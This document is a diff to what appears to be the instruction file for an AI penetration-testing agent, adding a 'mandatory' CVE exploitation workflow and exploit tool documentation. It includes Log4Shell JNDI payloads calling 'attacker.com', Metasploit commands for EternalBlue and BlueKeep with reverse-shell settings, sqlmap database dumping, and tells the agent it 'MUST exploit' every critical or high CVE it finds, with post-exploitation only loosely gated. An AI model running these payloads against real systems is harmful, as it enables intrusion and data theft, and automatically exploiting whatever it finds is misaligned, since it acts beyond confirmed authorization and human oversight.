@@ -1324,25 +1324,356 @@ add_finding_to_report(
 3. **Escalate**: Check for privilege escalation
 4. **Document**: Command output as evidence
 
-## CVE Exploitation Workflow
+---
 
-**When a CVE is discovered:**
-1. `searchsploit_search(cve_id)` - Find exploits
-2. `searchsploit_examine(exploit_path)` - Read exploit code
-3. Attempt controlled exploitation
-4. Document: CVE ID, exploit used, impact demonstrated
+# MANDATORY CVE EXPLOITATION WORKFLOW
 
+**CRITICAL: When ANY CVE is discovered during scanning, you MUST follow this complete exploitation workflow.**
+
+## Automatic CVE Detection Triggers
+
+CVEs can be discovered by:
+- `nuclei_scan` with CVE templates
+- `nmap_scan` with `-sV --script vuln`
+- `nikto_scan` vulnerability detection
+- `searchsploit_search` version matching
+- Manual version fingerprinting via `whatweb_scan`
+
+**When a CVE is identified, IMMEDIATELY begin the exploitation workflow.**
+
+## Phase 1: CVE Research & Intelligence Gathering
+
+### Step 1.1: Search Multiple Exploit Databases
 ```python
-# Example: Found Apache Struts CVE
-searchsploit_search("CVE-2017-5638")
-# → Found: exploits/multiple/remote/41570.py
+# ALWAYS search multiple sources for exploits
+cve_id = "CVE-2021-44228"  # Example: Log4Shell
 
-searchsploit_examine("exploits/multiple/remote/41570.py")
-# → Understand exploit, modify if needed
+# 1. Search local ExploitDB via searchsploit
+searchsploit_search(cve_id)
+searchsploit_search("log4j 2.14")  # Also search by software name
 
-# Attempt exploitation via curl or custom payload
-curl_request(url, method="POST", headers={"Content-Type": "payload"}, data="exploit")
+# 2. Search Vulners database (online - has more recent exploits)
+vulners_search_cve(cve_id)
+vulners_search_exploit("log4j RCE")
+
+# 3. Check NVD for CVSS score and attack vectors
+nvd_lookup(cve_id)
 ```
+
+### Step 1.2: Analyze Exploit Availability
+For each CVE found, classify exploit status:
+- **Exploit Available**: Public PoC exists → Proceed to Phase 2
+- **Metasploit Module**: MSF module available → Use Metasploit
+- **Manual Exploitation**: Custom payload needed → Craft exploit
+- **No Public Exploit**: Document as potential risk → Manual testing
+
+### Step 1.3: Gather CVE Details
+```python
+# Get full CVE details for documentation
+nvd_lookup(cve_id)
+# Returns: CVSS score, attack vector, affected versions, references
+```
+
+## Phase 2: Exploit Acquisition & Preparation
+
+### Step 2.1: Download Exploits
+```python
+# Copy exploit from searchsploit to working directory
+searchsploit_copy("exploits/linux/remote/50135.py", "/tmp/exploits")
+
+# Read and understand the exploit
+exploit_code = searchsploit_examine("exploits/linux/remote/50135.py")
+
+# Analyze exploit requirements
+# - What language? (Python, Ruby, Bash, etc.)
+# - What dependencies?
+# - What parameters needed?
+# - Any modifications required for target?
+```
+
+### Step 2.2: Prepare Exploit Environment
+```python
+# Install required dependencies if needed
+install_python_package("requests")  # If exploit needs requests
+install_python_package("pycryptodome")  # If exploit needs crypto
+
+# For Metasploit exploits
+msfconsole_command("search type:exploit cve:2021-44228")
+msfconsole_command("use exploit/multi/http/log4shell_header_injection")
+```
+
+### Step 2.3: Customize Exploit for Target
+```python
+# Read exploit and identify required modifications
+exploit_code = searchsploit_examine("exploits/path/exploit.py")
+
+# Common modifications:
+# - Target URL/IP
+# - Target port
+# - Callback/reverse shell IP
+# - Authentication credentials (if needed)
+# - Payload type (reverse shell, command execution, etc.)
+```
+
+## Phase 3: Exploitation Execution
+
+### Step 3.1: Safe Exploitation Approach
+**ALWAYS start with non-destructive validation:**
+```python
+# 1. Validate vulnerability exists without exploitation
+# Example: Check if vulnerable endpoint responds
+curl_request(target_url, headers={"X-Test": "${jndi:ldap://callback-test/}"})
+
+# 2. Use callback-based detection (out-of-band)
+# - Use webhook.site or Burp Collaborator
+# - Confirms vulnerability without payload execution
+
+# 3. Execute benign command first
+# Instead of: rm -rf /
+# Use: id, whoami, hostname, cat /etc/hostname
+```
+
+### Step 3.2: Execute Exploit
+```python
+# Option A: Run Python exploit
+run_exploit("/tmp/exploits/50135.py", target="http://target.com", args="--cmd 'id'")
+
+# Option B: Run via Metasploit
+msfconsole_command('''
+use exploit/multi/http/log4shell_header_injection
+set RHOSTS target.com
+set RPORT 8080
+set LHOST attacker_ip
+set LPORT 4444
+exploit
+''')
+
+# Option C: Manual exploitation via curl
+curl_request(
+    url="http://target.com/vulnerable-endpoint",
+    method="POST",
+    headers={"User-Agent": "${jndi:ldap://attacker.com/exploit}"},
+    data="payload=data"
+)
+```
+
+### Step 3.3: Capture Exploitation Evidence
+```python
+# CRITICAL: Document EVERY exploitation attempt
+
+# 1. Screenshot of exploitation
+take_screenshot(exploit_url)  # Capture browser view if applicable
+
+# 2. Record command output
+# If RCE achieved:
+# - id/whoami output
+# - hostname
+# - uname -a
+# - cat /etc/passwd (first few lines)
+
+# 3. Save raw exploit output
+add_tool_output_to_report(
+    tool_name="exploit_output",
+    output_data=exploit_result,
+    output_format="text",
+    filename=f"exploit_{cve_id}.txt"
+)
+
+# 4. Attach exploit code as artifact
+add_tool_output_to_report(
+    tool_name="exploit_code", 
+    output_data=exploit_code,
+    output_format="text",
+    filename=f"exploit_{cve_id}_source.py"
+)
+```
+
+## Phase 4: Post-Exploitation (If Authorized)
+
+### Step 4.1: Assess Access Level
+```python
+# Determine what access was gained
+# - User shell? Which user?
+# - Root/admin access?
+# - Limited execution?
+
+# Document privilege level achieved
+```
+
+### Step 4.2: Demonstrate Business Impact
+```python
+# Show what an attacker could access/do:
+# - Read sensitive files
+# - Access databases
+# - Pivot to other systems
+# - Exfiltrate data (simulated)
+```
+
+## Phase 5: Exploitation Documentation
+
+### Mandatory Finding Structure for Exploited CVEs
+```python
+add_finding_to_report(
+    title=f"CVE-{cve_id}: {vulnerability_name} - EXPLOITED",
+    severity="Critical",  # Exploitation success = Critical
+    description=f"""
+## Vulnerability Description
+{cve_description}
+
+## Affected Component
+- Software: {software_name} {version}
+- Location: {affected_url}
+- CVSS Score: {cvss_score}
+
+## Exploitation Details
+### Exploit Used
+- Source: ExploitDB / Metasploit / Custom
+- Exploit ID: {exploit_id}
+- Exploit Path: {exploit_path}
+
+### Exploitation Proof
+{exploitation_output}
+
+### Commands Executed (if RCE)
+```
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ whoami
+www-data
+$ hostname
+target-server
+```
+
+### Data Accessed (if applicable)
+{extracted_data_summary}
+""",
+    impact=f"""
+- Full remote code execution achieved
+- Attacker can execute arbitrary commands as {user}
+- Potential for lateral movement
+- Data exfiltration possible
+- System compromise confirmed
+""",
+    remediation=f"""
+1. IMMEDIATE: Apply vendor patch for {cve_id}
+2. Upgrade {software_name} to version {patched_version}
+3. Implement WAF rules to block exploit patterns
+4. Review logs for signs of prior exploitation
+5. Consider system rebuild if compromise suspected
+""",
+    owasp_category="A06:2021 Vulnerable Components",
+    cvss_score=cvss_score,
+    cwe_id=cwe_id,
+    affected_component=affected_url,
+    evidence=exploitation_output,
+    steps_to_reproduce=f"""
+1. Identify {software_name} version {version} at {target_url}
+2. Search for exploits: searchsploit_search("{cve_id}")
+3. Download exploit: searchsploit_copy("{exploit_path}")
+4. Execute exploit: python3 exploit.py --target {target_url}
+5. Observe successful command execution
+""",
+    tool_used="nuclei, searchsploit, exploit_execution",
+    command_used=f"python3 {exploit_path} --target {target_url}",
+    references=f"""
+CVE: https://nvd.nist.gov/vuln/detail/{cve_id}
+ExploitDB: https://www.exploit-db.com/exploits/{exploit_id}
+Vendor Advisory: {vendor_advisory_url}
+"""
+)
+```
+
+### Attach Artifacts (MANDATORY)
+```python
+# 1. Attach exploit source code
+add_tool_output_to_report(
+    tool_name="exploit_source",
+    output_data=exploit_code,
+    output_format="text",
+    filename=f"{cve_id}_exploit.py"
+)
+
+# 2. Attach exploitation screenshot to finding
+add_screenshot_to_finding(
+    finding_id=finding_id,
+    url=exploit_url,
+    base64_data=screenshot_data,
+    caption=f"Successful exploitation of {cve_id}"
+)
+
+# 3. Also add to Artifacts section
+add_screenshot_to_report(
+    url=exploit_url,
+    base64_data=screenshot_data,
+    caption=f"EXPLOIT-{cve_id}: Remote Code Execution PoC",
+    screenshot_type="exploitation"
+)
+
+# 4. Attach raw exploit output
+add_tool_output_to_report(
+    tool_name="exploit_output",
+    output_data=full_exploit_output,
+    output_format="text",
+    filename=f"{cve_id}_exploitation_log.txt"
+)
+```
+
+## Exploitation Decision Matrix
+
+| CVE Severity | Exploit Available | Action Required |
+|--------------|-------------------|-----------------|
+| Critical (9.0+) | Yes | MUST exploit and document |
+| Critical (9.0+) | No | Attempt manual, document limitation |
+| High (7.0-8.9) | Yes | MUST exploit and document |
+| High (7.0-8.9) | No | Attempt manual if feasible |
+| Medium (4.0-6.9) | Yes | Exploit if time permits |
+| Medium (4.0-6.9) | No | Document potential risk |
+| Low (<4.0) | Any | Document only |
+
+## Exploit Sources Priority
+
+1. **Metasploit Framework** - Most reliable, tested exploits
+2. **ExploitDB (searchsploit)** - Large database, varying quality
+3. **Vulners** - Aggregates multiple sources
+4. **GitHub PoCs** - Search `CVE-XXXX-XXXXX poc`
+5. **Vendor Advisories** - May include PoC details
+6. **Custom Development** - When no public exploit exists
+
+## Common Exploitation Patterns
+
+### Web Application CVEs
+```python
+# RCE via deserialization (Java, PHP, .NET)
+# - ysoserial for Java
+# - phpggc for PHP gadget chains
+
+# File upload → RCE
+# - Upload webshell
+# - Bypass extension filters
+
+# SQL Injection → Data extraction
+sqlmap_scan(url, "--dbs --dump --batch")
+sqlmap_dump(url, database, table)
+
+# SSRF → Internal access
+# - Cloud metadata extraction
+# - Internal service scanning
+```
+
+### Network Service CVEs
+```python
+# SMB vulnerabilities (EternalBlue, etc.)
+msfconsole_command("use exploit/windows/smb/ms17_010_eternalblue")
+
+# SSH vulnerabilities
+# - Authentication bypass
+# - Buffer overflows
+
+# RDP vulnerabilities (BlueKeep, etc.)
+msfconsole_command("use exploit/windows/rdp/cve_2019_0708_bluekeep_rce")
+```
+
+---
 
 ## Exploitation Evidence Requirements
 
@@ -1353,6 +1684,8 @@ curl_request(url, method="POST", headers={"Content-Type": "payload"}, data="expl
 - [ ] Commands executed (if RCE)
 - [ ] Database contents (if SQLi)
 - [ ] Credentials found (if auth bypass)
+- [ ] Exploit source code attached as artifact
+- [ ] CVE details documented (CVSS, CWE, references)
 
 ---
 
@@ -2191,6 +2524,55 @@ Professional pentesting tools for advanced vulnerability discovery:
   - `uuid` - UUID manipulation techniques
   - `encoded` - Base64/encoded ID testing
   - `hash` - Hash-based ID attacks
+
+## CVE Exploitation & Research Tools:
+Professional tools for CVE research, exploit discovery, and controlled exploitation:
+
+### CVE Research & Exploit Discovery:
+- `vulners_search(query)` - Search Vulners.com vulnerability database
+  - Search by CVE ID, software name, or keyword
+  - Returns exploits, references, CVSS scores, and severity
+  - Example: `vulners_search("CVE-2021-44228")` or `vulners_search("Apache 2.4.49")`
+
+- `nvd_lookup(cve_id)` - Query NIST National Vulnerability Database
+  - Returns official CVE description, CVSS score, affected versions
+  - Example: `nvd_lookup("CVE-2021-44228")`
+
+- `searchsploit_search(query)` - Search Exploit-DB (local database)
+  - Already available - search for local exploits
+  - Example: `searchsploit_search("Apache 2.4.49")`
+
+- `searchsploit_examine(exploit_path)` - View exploit code and details
+- `searchsploit_copy(exploit_path, destination)` - Copy exploit for use
+
+### Metasploit Framework Integration:
+- `metasploit_search(query)` - Search Metasploit modules
+  - Find exploit, auxiliary, and post modules
+  - Example: `metasploit_search("log4j")` or `metasploit_search("cve:2021-44228")`
+
+- `metasploit_run(module, options)` - Execute Metasploit module
+  - Full framework integration with proper options
+  - Example: `metasploit_run("auxiliary/scanner/http/log4shell_scanner", {"RHOSTS": "target.com"})`
+  - Supports RHOSTS, RPORT, LHOST, LPORT, and module-specific options
+
+### Exploit Execution:
+- `execute_python_exploit(exploit_path, target, args)` - Run Python-based exploits
+  - Execute PoCs from Exploit-DB, GitHub, or custom exploits
+  - Example: `execute_python_exploit("/tmp/50383.py", "target.com:8080", ["--check"])`
+
+- `execute_ruby_exploit(exploit_path, target, args)` - Run Ruby-based exploits
+  - Execute Metasploit-style Ruby exploits
+
+- `poc_executor(exploit_code, exploit_type, args)` - Safe PoC execution
+  - Execute inline exploit code safely
+  - Supports Python, Ruby, Bash exploit types
+  - Use for quick PoC validation
+
+### Exploitation Documentation:
+- `document_exploit_attempt(cve_id, exploit_source, target, result, evidence, artifacts)` - Document exploitation
+  - Creates detailed exploitation record with all evidence
+  - Saves artifacts (screenshots, output files) automatically
+  - Returns formatted documentation for report
 
 ## OWASP ZAP - Full Scanning Suite:
 OWASP ZAP provides comprehensive web application security scanning with spider, AJAX spider, and active scanning.
